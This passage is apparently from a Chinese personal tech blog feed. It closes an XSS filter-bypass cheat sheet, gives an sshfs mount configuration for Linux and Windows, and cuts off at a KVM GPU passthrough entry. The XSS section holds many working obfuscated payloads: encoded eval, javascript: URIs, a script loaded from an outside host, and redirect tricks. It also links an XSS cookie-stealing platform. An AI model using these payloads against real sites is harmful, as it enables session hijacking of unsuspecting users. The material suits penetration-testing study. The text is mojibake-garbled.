class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">eval(</span>&#x27;\<span class="hljs-attr">x61</span>\<span class="hljs-attr">x6c</span>\<span class="hljs-attr">x65</span>\<span class="hljs-attr">x72</span>\<span class="hljs-attr">x74</span>\<span class="hljs-attr">x28</span>\<span class="hljs-attr">x27</span>\<span class="hljs-attr">x78</span>\<span class="hljs-attr">x73</span>\<span class="hljs-attr">x73</span>\<span class="hljs-attr">x27</span>\<span class="hljs-attr">x29</span>&#x27;)&gt;</span><br><br># å…«è¿›åˆ¶<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>&#x27;\<span class="hljs-attr">170</span>\<span class="hljs-attr">163</span>\<span class="hljs-attr">163</span>&#x27;)&gt;</span><br><br># base64<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;eval(atob(&#x27;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#x27;))&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="3-2-1-4-å†…åµŒç¼–ç åTAB"><a href="#3-2-1-4-å†…åµŒç¼–ç åTAB" class="headerlink" title="3.2.1.4 å†…åµŒç¼–ç åTAB"></a>3.2.1.4 å†…åµŒç¼–ç åTAB</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;jav<span class="hljs-symbol">&amp;#x09;</span>ascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="3-2-1-5-å¤šé‡å°–æ‹¬å·"><a href="#3-2-1-5-å¤šé‡å°–æ‹¬å·" class="headerlink" title="3.2.1.5 å¤šé‡å°–æ‹¬å·"></a>3.2.1.5 å¤šé‡å°–æ‹¬å·</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;XSS&quot;</span>);<span class="hljs-comment">//&lt;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="3-2-1-6-å°†JSæ–‡ä»¶é‡å‘½åä¸ºå›¾åƒ"><a href="#3-2-1-6-å°†JSæ–‡ä»¶é‡å‘½åä¸ºå›¾åƒ" class="headerlink" title="3.2.1.6 å°†JSæ–‡ä»¶é‡å‘½åä¸ºå›¾åƒ"></a>3.2.1.6 å°†JSæ–‡ä»¶é‡å‘½åä¸ºå›¾åƒ</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://xss.rooks/xss.jpg&quot;</span>&gt;</span><span class="language-handlebars"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span></span><br></code></pre></td></tr></table></figure><h3 id="3-2-2-è¿‡æ»¤ç©ºæ ¼-x2F-å¼•å·"><a href="#3-2-2-è¿‡æ»¤ç©ºæ ¼-x2F-å¼•å·" class="headerlink" title="3.2.2 è¿‡æ»¤ç©ºæ ¼&#x2F;å¼•å·"></a>3.2.2 è¿‡æ»¤ç©ºæ ¼&#x2F;å¼•å·</h3><h4 id="3-2-2-1-ä½¿ç”¨-x2F-ä»£æ›¿"><a href="#3-2-2-1-ä½¿ç”¨-x2F-ä»£æ›¿" class="headerlink" title="3.2.2.1 ä½¿ç”¨&#x2F;ä»£æ›¿"></a>3.2.2.1 ä½¿ç”¨&#x2F;ä»£æ›¿</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;img/src=&quot;x&quot;/onerror=alert(&quot;xss&quot;);&gt;<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(/xss/);</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="3-2-3-è¿‡æ»¤å•-x2F-åŒå¼•å·"><a href="#3-2-3-è¿‡æ»¤å•-x2F-åŒå¼•å·" class="headerlink" title="3.2.3 è¿‡æ»¤å•&#x2F;åŒå¼•å·"></a>3.2.3 è¿‡æ»¤å•&#x2F;åŒå¼•å·</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"># ä½¿ç”¨åå¼•å·ä»£æ›¿<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>`<span class="hljs-attr">xss</span>`);&gt;</span><br># ç¼–ç ç»•è¿‡<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(&amp;#x27;xss&amp;#x27;);</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="3-2-4-è¿‡æ»¤æ‹¬å·"><a href="#3-2-4-è¿‡æ»¤æ‹¬å·" class="headerlink" title="3.2.4 è¿‡æ»¤æ‹¬å·"></a>3.2.4 è¿‡æ»¤æ‹¬å·</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"># ä½¿ç”¨ throw ç»•è¿‡<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">onerror=alert;<span class="hljs-keyword">throw</span> <span class="hljs-number">1337</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>&gt; onerroråœ¨æ¯æ¬¡javascriptæ‰§è¡Œå¼‚å¸¸æ—¶éƒ½ä¼šè¢«æ¿€æ´»ï¼Œè°ƒç”¨æŒ‡å®šçš„å¤„ç†ç¨‹åºï¼Œå¹¶ä¸”throwè¯­å¥å¯åˆ›å»ºä¸€ä¸ªå‘é€åˆ°onerrorå¤„çš„åŒ…å«è¡¨è¾¾å¼çš„è‡ªå®šä¹‰å¼‚å¸¸ã€‚å› ä¸ºthrowæ˜¯ä¸€ä¸ªè¯­å¥ï¼Œåœ¨å’Œonerroré…åˆä½¿ç”¨æ—¶éœ€è¦ç”¨åˆ†å·éš”ç¦»ï¼Œé¿å…è¢«åŒ…å«ã€‚<br><br># ä½¿ç”¨``ä»£æ›¿<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">alert<span class="hljs-string">`1`</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br># HTMLç¼–ç ç»•è¿‡<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">alert<span class="hljs-symbol">&amp;#x28;</span>1<span class="hljs-symbol">&amp;#x29;</span></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="3-2-5-è¿‡æ»¤URLåœ°å€"><a href="#3-2-5-è¿‡æ»¤URLåœ°å€" class="headerlink" title="3.2.5 è¿‡æ»¤URLåœ°å€"></a>3.2.5 è¿‡æ»¤URLåœ°å€</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs html"># ä½¿ç”¨URLç¼–ç <br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">document.location</span>=`<span class="hljs-attr">http:</span>//%<span class="hljs-attr">77</span>%<span class="hljs-attr">77</span>%<span class="hljs-attr">77</span>%<span class="hljs-attr">2e</span>%<span class="hljs-attr">62</span>%<span class="hljs-attr">61</span>%<span class="hljs-attr">69</span>%<span class="hljs-attr">64</span>%<span class="hljs-attr">75</span>%<span class="hljs-attr">2e</span>%<span class="hljs-attr">63</span>%<span class="hljs-attr">6f</span>%<span class="hljs-attr">6d</span>/`&gt;</span><br><br># ä½¿ç”¨IP<br># ä½¿ç”¨è¿›åˆ¶è½¬æ¢<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">document.location</span>=`<span class="hljs-attr">http:</span>//<span class="hljs-attr">2130706433</span>/`&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">document.location</span>=`<span class="hljs-attr">http:</span>//<span class="hljs-attr">0177.0.0.01</span>/`&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">document.location</span>=`<span class="hljs-attr">http:</span>//<span class="hljs-attr">0x7f.0x0.0x0.0x1</span>/`&gt;</span><br><br># htmlæ ‡ç­¾ä¸­ç”¨//å¯ä»¥ä»£æ›¿http://<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">document.location</span>=`//<span class="hljs-attr">www.baidu.com</span>`&gt;</span><br><br># ä½¿ç”¨\\<br>ä½†æ˜¯è¦æ³¨æ„åœ¨windowsä¸‹\æœ¬èº«å°±æœ‰ç‰¹æ®Šç”¨é€”ï¼Œæ˜¯ä¸€ä¸ª path çš„å†™æ³•ï¼Œæ‰€ä»¥\åœ¨Windowsä¸‹æ˜¯fileåè®®ï¼Œåœ¨linuxä¸‹æ‰ä¼šæ˜¯å½“å‰åŸŸçš„åè®®<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">document.location</span>=`\\<span class="hljs-attr">www.baidu.com</span>`&gt;</span><br><br># ä½¿ç”¨ä¸­æ–‡å¥å·ä»£æ›¿è‹±æ–‡ç‚¹å·<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;document.location=`http://wwwã€‚baiduã€‚com`&quot;</span>&gt;</span><br><br># åˆ©ç”¨dataç±»å‹çš„urlä»£æ›¿http://<br>data:text,alert()<br></code></pre></td></tr></table></figure><h1 id="4-åˆ©ç”¨"><a href="#4-åˆ©ç”¨" class="headerlink" title="4 åˆ©ç”¨"></a>4 åˆ©ç”¨</h1><p><a href="https://xss.pt/xss.php?do=login">XSS plamform</a></p><ul><li><p>cookie editor æµè§ˆå™¨æ’ä»¶</p></li><li><p>burp æ›´æ¢ http å¤´éƒ¨çš„ cookieã€useragent å­—æ®µ</p></li></ul><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://johnfrod.top/%e5%ae%89%e5%85%a8/xss%e6%80%bb%e7%bb%93/">xssæ€»ç»“</a><br><a href="https://johnfrod.top/%e5%ae%89%e5%85%a8/xss%e7%bc%96%e7%a0%81%e5%89%96%e6%9e%90/">xssç¼–ç å‰–æ</a><br><a href="https://saucer-man.com/information_security/103.html">æ¢ç´¢XSSåˆ©ç”¨ç¼–ç ç»•è¿‡çš„åŸç†</a></p>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>PenTest</category>
      
      <category>ç»å…¸æ¼æ´</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Security</tag>
      
      <tag>PenTest</tag>
      
      <tag>ç»å…¸æ¼æ´</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sshfsé…ç½®</title>
    <link href="/2022/07/20/2022-07-20.sshfs/"/>
    <url>/2022/07/20/2022-07-20.sshfs/</url>
    
    <content type="html"><![CDATA[<ul><li><a href="#1-server-%E7%AB%AF%E9%85%8D%E7%BD%AE">1 server ç«¯é…ç½®</a><ul><li><a href="#11-linux-%E9%85%8D%E7%BD%AE">1.1 linux é…ç½®</a></li><li><a href="#12-windows-%E9%85%8D%E7%BD%AE">1.2 windows é…ç½®</a></li></ul></li><li><a href="#2-client-%E7%AB%AF">2 client ç«¯</a><ul><li><a href="#21-linux-%E6%8C%82%E8%BD%BD">2.1 linux æŒ‚è½½</a></li><li><a href="#22-windows-%E6%8C%82%E8%BD%BD">2.2 windows æŒ‚è½½</a></li></ul></li></ul><h1 id="1-server-ç«¯é…ç½®"><a href="#1-server-ç«¯é…ç½®" class="headerlink" title="1 server ç«¯é…ç½®"></a>1 server ç«¯é…ç½®</h1><p>windows æ“ä½œç³»ç»Ÿéœ€è¦å®‰è£…å¯é€‰åŠŸèƒ½, OpenSSHæœåŠ¡å™¨ã€‚</p><p>é…ç½® <code>server</code> ç«¯ <code>/etc/ssh/sshd_config</code> æˆ– <code>C:\ProgramData\ssh\sshd_config</code> æ–‡ä»¶</p><h2 id="1-1-linux-é…ç½®"><a href="#1-1-linux-é…ç½®" class="headerlink" title="1.1 linux é…ç½®"></a>1.1 linux é…ç½®</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">PermitRootLogin <span class="hljs-built_in">yes</span><br>PubkeyAuthentication <span class="hljs-built_in">yes</span><br>PasswordAuthentication no<br><span class="hljs-comment"># é˜²æ­¢sshè¶…æ—¶æ–­å¼€è¿æ¥ï¼Œå¼€å¯ä¸‹åˆ—ä¸¤é¡¹</span><br>ClientAliveInterval 120<br>ClientAliveCountMax 3<br></code></pre></td></tr></table></figure><h2 id="1-2-windows-é…ç½®"><a href="#1-2-windows-é…ç½®" class="headerlink" title="1.2 windows é…ç½®"></a>1.2 windows é…ç½®</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># This is the sshd server system-wide configuration file.  See</span><br><span class="hljs-comment"># sshd_config(5) for more information.</span><br><br><span class="hljs-comment"># The strategy used for options in the default sshd_config shipped with</span><br><span class="hljs-comment"># OpenSSH is to specify options with their default value where</span><br><span class="hljs-comment"># possible, but leave them commented.  Uncommented options override the</span><br><span class="hljs-comment"># default value.</span><br><br><span class="hljs-comment">#Port 22</span><br><span class="hljs-comment">#AddressFamily any</span><br><span class="hljs-comment">#ListenAddress 0.0.0.0</span><br><span class="hljs-comment">#ListenAddress ::</span><br><br><span class="hljs-comment">#HostKey __PROGRAMDATA__/ssh/ssh_host_rsa_key</span><br><span class="hljs-comment">#HostKey __PROGRAMDATA__/ssh/ssh_host_dsa_key</span><br><span class="hljs-comment">#HostKey __PROGRAMDATA__/ssh/ssh_host_ecdsa_key</span><br><span class="hljs-comment">#HostKey __PROGRAMDATA__/ssh/ssh_host_ed25519_key</span><br><br><span class="hljs-comment"># Ciphers and keying</span><br><span class="hljs-comment">#RekeyLimit default none</span><br><br><span class="hljs-comment"># Logging</span><br><span class="hljs-comment">#SyslogFacility AUTH</span><br><span class="hljs-comment">#LogLevel INFO</span><br><br><span class="hljs-comment"># Authentication:</span><br><br><span class="hljs-comment">#LoginGraceTime 2m</span><br><span class="hljs-comment">#PermitRootLogin prohibit-password</span><br>PermitRootLogin <span class="hljs-built_in">yes</span><br><span class="hljs-comment">#StrictModes yes</span><br><span class="hljs-comment">#MaxAuthTries 6</span><br><span class="hljs-comment">#MaxSessions 10</span><br><br>PubkeyAuthentication <span class="hljs-built_in">yes</span><br><br><span class="hljs-comment"># The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2</span><br><span class="hljs-comment"># but this is overridden so installations will only check .ssh/authorized_keys</span><br>AuthorizedKeysFile.ssh/authorized_keys<br><br><span class="hljs-comment">#AuthorizedPrincipalsFile none</span><br><br><span class="hljs-comment"># For this to work you will also need host keys in %programData%/ssh/ssh_known_hosts</span><br><span class="hljs-comment">#HostbasedAuthentication no</span><br><span class="hljs-comment"># Change to yes if you don&#x27;t trust ~/.ssh/known_hosts for</span><br><span class="hljs-comment"># HostbasedAuthentication</span><br><span class="hljs-comment">#IgnoreUserKnownHosts no</span><br><span class="hljs-comment"># Don&#x27;t read the user&#x27;s ~/.rhosts and ~/.shosts files</span><br><span class="hljs-comment">#IgnoreRhosts yes</span><br><br><span class="hljs-comment"># To disable tunneled clear text passwords, change to no here!</span><br>PasswordAuthentication no<br><span class="hljs-comment">#PermitEmptyPasswords no</span><br><br><span class="hljs-comment"># GSSAPI options</span><br><span class="hljs-comment">#GSSAPIAuthentication no</span><br><br><span class="hljs-comment">#AllowAgentForwarding yes</span><br><span class="hljs-comment">#AllowTcpForwarding yes</span><br><span class="hljs-comment">#GatewayPorts no</span><br><span class="hljs-comment">#PermitTTY yes</span><br><span class="hljs-comment">#PrintMotd yes</span><br><span class="hljs-comment">#PrintLastLog yes</span><br><span class="hljs-comment">#TCPKeepAlive yes</span><br><span class="hljs-comment">#UseLogin no</span><br><span class="hljs-comment">#PermitUserEnvironment no</span><br>ClientAliveInterval 120<br>ClientAliveCountMax 3<br><span class="hljs-comment">#UseDNS no</span><br><span class="hljs-comment">#PidFile /var/run/sshd.pid</span><br><span class="hljs-comment">#MaxStartups 10:30:100</span><br><span class="hljs-comment">#PermitTunnel no</span><br><span class="hljs-comment">#ChrootDirectory none</span><br><span class="hljs-comment">#VersionAddendum none</span><br><br><span class="hljs-comment"># no default banner path</span><br><span class="hljs-comment">#Banner none</span><br><br><span class="hljs-comment"># override default of no subsystems</span><br>Subsystemsftpsftp-server.exe<br><br><span class="hljs-comment"># Example of overriding settings on a per-user basis</span><br><span class="hljs-comment">#Match User anoncvs</span><br><span class="hljs-comment">#AllowTcpForwarding no</span><br><span class="hljs-comment">#PermitTTY no</span><br><span class="hljs-comment">#ForceCommand cvs server</span><br><br><span class="hljs-comment">#Match Group administrators</span><br><span class="hljs-comment">#       AuthorizedKeysFile __PROGRAMDATA__/ssh/administrators_authorized_keys</span><br></code></pre></td></tr></table></figure><h1 id="2-client-ç«¯"><a href="#2-client-ç«¯" class="headerlink" title="2 client ç«¯"></a>2 client ç«¯</h1><h2 id="2-1-linux-æŒ‚è½½"><a href="#2-1-linux-æŒ‚è½½" class="headerlink" title="2.1 linux æŒ‚è½½"></a>2.1 linux æŒ‚è½½</h2><p>æŒ‚è½½å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo sshfs ç”¨æˆ·@ip:serverç«¯è·¯å¾„ clientç«¯æŒ‚è½½è·¯å¾„ -o reconnect -o cache=<span class="hljs-built_in">yes</span> -o port=sshç«¯å£å· -o <span class="hljs-built_in">users</span> -o allow_other<br></code></pre></td></tr></table></figure><p>fstab æ–‡ä»¶å†™æ³•,ä»¥Dç›˜ä¸ºä¾‹:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ç”¨æˆ·@ip:serverip:D://home/worisursshfsdefaults,_netdev,<span class="hljs-built_in">umask</span>=0022,uid=1001,gid=998,allow_other0 0<br></code></pre></td></tr></table></figure><h2 id="2-2-windows-æŒ‚è½½"><a href="#2-2-windows-æŒ‚è½½" class="headerlink" title="2.2 windows æŒ‚è½½"></a>2.2 windows æŒ‚è½½</h2><p>å®‰è£…ä»¥ä¸‹å·¥å…·ï¼š</p><p><a href="https://github.com/billziss-gh/sshfs-win/releases">sshfs-win</a><br><a href="https://github.com/billziss-gh/winfsp/releases">winfsp</a><br><a href="https://github.com/evsar3/sshfs-win-manager/releases">SSHFS-Win Manager</a></p><p>é…ç½®æ–‡ä»¶ä½ç½® <code>C:\Users\ç”¨æˆ·\AppData\Roaming\sshfs-win-manager\vuex.json</code> </p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs wren">&#123;<br><span class="hljs-string">&quot;state&quot;</span>: &#123;<br><span class="hljs-string">&quot;Data&quot;</span>: &#123;<br><span class="hljs-string">&quot;connections&quot;</span>: [<br>&#123;<br><span class="hljs-string">&quot;advanced&quot;</span>: &#123;<br><span class="hljs-string">&quot;connectOnStartup&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;customCmdlOptions&quot;</span>: [],<br><span class="hljs-string">&quot;customCmdlOptionsEnabled&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;reconnect&quot;</span>: <span class="hljs-literal">false</span><br>&#125;,<br><span class="hljs-string">&quot;authType&quot;</span>: <span class="hljs-string">&quot;key-file&quot;</span>,<br><span class="hljs-string">&quot;folder&quot;</span>: <span class="hljs-string">&quot;/0.main&quot;</span>,<br><span class="hljs-string">&quot;host&quot;</span>: <span class="hljs-string">&quot;ip&quot;</span>,<br><span class="hljs-string">&quot;key&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br><span class="hljs-string">&quot;keyFile&quot;</span>: <span class="hljs-string">&quot;C:<span class="hljs-char escape_">\\</span>Users<span class="hljs-char escape_">\\</span>ç”¨æˆ·<span class="hljs-char escape_">\\</span>.ssh<span class="hljs-char escape_">\\</span>id_rsa&quot;</span>,<br><span class="hljs-string">&quot;mountPoint&quot;</span>: <span class="hljs-string">&quot;A:&quot;</span>,<br><span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;worisur&quot;</span>,<br><span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br><span class="hljs-string">&quot;pid&quot;</span>: <span class="hljs-number">4624</span>,<br><span class="hljs-string">&quot;port&quot;</span>: <span class="hljs-number">50011</span>,<br><span class="hljs-string">&quot;preferredMountPoint&quot;</span>: <span class="hljs-literal">null</span>,<br><span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;connected&quot;</span>,<br><span class="hljs-string">&quot;user&quot;</span>: <span class="hljs-string">&quot;ç”¨æˆ·&quot;</span>,<br><span class="hljs-string">&quot;uuid&quot;</span>: <span class="hljs-string">&quot;63308430-7dbf-4c8a-9fe5-a6c4bd28b595&quot;</span><br>&#125;<br>]<br>&#125;,<br><span class="hljs-string">&quot;Settings&quot;</span>: &#123;<br><span class="hljs-string">&quot;settings&quot;</span>: &#123;<br><span class="hljs-string">&quot;sshfsBinary&quot;</span>: <span class="hljs-string">&quot;C:<span class="hljs-char escape_">\\</span>Atools<span class="hljs-char escape_">\\</span>network<span class="hljs-char escape_">\\</span>sshfs<span class="hljs-char escape_">\\</span>sshfs-win<span class="hljs-char escape_">\\</span>bin<span class="hljs-char escape_">\\</span>sshfs.exe&quot;</span>,<br><span class="hljs-string">&quot;startupWithOS&quot;</span>: <span class="hljs-literal">true</span>,<br><span class="hljs-string">&quot;displayTrayMessageOnClose&quot;</span>: <span class="hljs-literal">true</span>,<br><span class="hljs-string">&quot;processTrackTimeout&quot;</span>: <span class="hljs-number">15</span>,<br><span class="hljs-string">&quot;showDebugPanel&quot;</span>: <span class="hljs-literal">false</span><br>&#125;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ssh</category>
      
      <category>sshfs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssh</tag>
      
      <tag>sshfs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kvm æ˜¾å¡ç›´é€š(å•æ˜¾å¡)</title>
    <link href="/2022/07/14/2022-07-14.kvm%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/"/>
    <url>/2022/07/14/2022-07-14.kvm%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/</url>
    
